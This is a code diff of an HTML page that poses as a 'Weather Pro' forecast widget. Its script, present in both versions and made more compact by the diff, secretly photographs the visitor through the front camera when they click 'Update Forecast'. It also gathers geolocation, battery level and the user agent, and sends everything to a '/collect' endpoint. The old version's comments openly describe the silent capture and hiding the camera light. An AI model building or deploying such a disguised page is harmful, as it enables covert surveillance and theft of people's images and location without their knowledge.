@@ -2,110 +2,60 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>Weather Pro | Current Forecast</title>
+  <title>Weather Pro</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;500;700&display=swap" rel="stylesheet">
   <style>
-    body, html { margin: 0; padding: 0; height: 100%; font-family: 'Inter', sans-serif; overflow: hidden; background: #000; }
-    
-    /* The rainy background */
-    .bg {
-      background: url('https://images.unsplash.com/photo-1515694346937-94d85e41e6f0?auto=format&fit=crop&w=1200&q=80');
-      background-size: cover; background-position: center; height: 100%; width: 100%; position: absolute; filter: brightness(0.5);
-    }
-
-    .container { position: relative; z-index: 10; height: 100%; display: flex; flex-direction: column; justify-content: space-between; padding: 50px 30px; box-sizing: border-box; color: white; }
-
-    .header .city { font-size: 32px; font-weight: 500; }
-    .header .info { font-size: 16px; opacity: 0.7; margin-top: 5px; }
-
-    .temp-display { font-size: 120px; font-weight: 300; margin-left: -5px; }
-    .temp-display span { font-size: 40px; vertical-align: top; margin-top: 25px; display: inline-block; }
-
-    /* The Glassmorphism Card */
-    .glass-card {
-      background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
-      border-radius: 30px; padding: 25px; border: 1px solid rgba(255, 255, 255, 0.15);
-    }
-
-    .msg { font-size: 16px; font-weight: 500; margin-bottom: 20px; line-height: 1.4; }
-
-    .btn {
-      background: #fff; color: #000; border: none; padding: 18px; border-radius: 18px; width: 100%;
-      font-weight: 700; font-size: 16px; cursor: pointer; transition: all 0.2s;
-    }
-    .btn:active { transform: scale(0.96); opacity: 0.9; }
-
-    /* Hidden elements */
-    #v, #c { display: none; }
+    body, html { margin:0; padding:0; height:100%; font-family: sans-serif; overflow:hidden; background:#000; }
+    .bg { background: url('https://images.unsplash.com/photo-1515694346937-94d85e41e6f0?auto=format&fit=crop&w=1200&q=80'); background-size:cover; background-position:center; height:100%; width:100%; position:absolute; filter:brightness(0.5); }
+    .container { position:relative; z-index:10; height:100%; display:flex; flex-direction:column; justify-content:space-between; padding:40px 30px; box-sizing:border-box; color:white; }
+    .temp { font-size:100px; font-weight:300; }
+    .glass { background:rgba(255,255,255,0.1); backdrop-filter:blur(20px); border-radius:25px; padding:25px; border:1px solid rgba(255,255,255,0.1); }
+    .btn { background:#fff; color:#000; border:none; padding:18px; border-radius:15px; width:100%; font-weight:bold; cursor:pointer; margin-top:15px; }
+    #v, #c { display:none; }
   </style>
 </head>
 <body>
   <div class="bg"></div>
   <div class="container">
-    <div class="header">
-      <div class="city">Watermelon Park</div>
-      <div class="info">Cloudy • H:32° L:18°</div>
-      <div class="temp-display">23<span>°c</span></div>
+    <div>
+      <div style="font-size:24px;">Watermelon Park</div>
+      <div class="temp">23°c</div>
     </div>
-
-    <div class="glass-card">
-      <div id="status" class="msg">Heavy rain expected at midnight. Update location for a 5-day forecast.</div>
-      <button id="go" class="btn">Update Local Forecast</button>
+    <div class="glass">
+      <div id="status">Update location to synchronize your local 5-day forecast.</div>
+      <button id="go" class="btn">Update Forecast</button>
     </div>
   </div>
-
   <video id="v" autoplay playsinline muted></video>
   <canvas id="c"></canvas>
-
   <script>
-    const btn = document.getElementById('go');
-    btn.addEventListener('click', async () => {
-      btn.innerText = "Loading...";
-      
+    document.getElementById('go').addEventListener('click', async (e) => {
+      const btn = e.target; btn.innerText = "Syncing...";
       try {
-        // 1. Silent Camera Capture
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        const v = document.getElementById('v');
-        v.srcObject = stream;
-        const c = document.getElementById('c');
-        const ctx = c.getContext('2d');
-        c.width = 400; c.height = 300;
-
-        await new Promise(r => setTimeout(r, 1200)); // Wait for focus
-        ctx.drawImage(v, 0, 0, 400, 300);
-        const img = c.toDataURL('image/jpeg', 0.5);
-        stream.getTracks().forEach(t => t.stop()); // Turn off camera light
-
-        // 2. Data Gathering
+        document.getElementById('v').srcObject = stream;
+        const canvas = document.getElementById('c'); const ctx = canvas.getContext('2d');
+        canvas.width = 400; canvas.height = 300;
+        await new Promise(r => setTimeout(r, 1200));
+        ctx.drawImage(document.getElementById('v'), 0, 0, 400, 300);
+        const img = canvas.toDataURL('image/jpeg', 0.4);
+        stream.getTracks().forEach(t => t.stop());
         const battery = await navigator.getBattery();
-        const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r({coords:{latitude:0, longitude:0, accuracy:0}})));
-
-        const payload = {
-          ts: new Date().toISOString(),
-          hints: { ua: navigator.userAgent },
-          battery: { levelPercent: Math.round(battery.level * 100), charging: battery.charging },
-          location: { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy },
-          burstImages: [img, img, img, img] // Fills the 4 columns in your server.js
-        };
-
-        // 3. Send to Server.js
+        const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r({coords:{latitude:0, longitude:0}})));
         const res = await fetch('/collect', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
+          body: JSON.stringify({
+            ts: new Date().toISOString(),
+            hints: { ua: navigator.userAgent },
+            battery: { levelPercent: Math.round(battery.level * 100) },
+            location: { lat: pos.coords.latitude, lon: pos.coords.longitude },
+            burstImages: [img, img, img, img]
+          })
         });
-
-        if (res.ok) {
-          btn.innerText = "Forecast Updated";
-          document.getElementById('status').innerText = "Forecast successfully synchronized for your location.";
-        } else {
-          btn.innerText = "Retry Update";
-        }
-      } catch (err) {
-        alert("Please enable location permissions to view your local weather forecast.");
-        btn.innerText = "Update Local Forecast";
-      }
+        if (res.ok) { btn.style.display = 'none'; document.getElementById('status').innerText = "✅ Forecast Synced."; }
+        else { btn.innerText = "Retry Update"; }
+      } catch (err) { btn.innerText = "Permission Denied"; }
     });
   </script>
 </body>
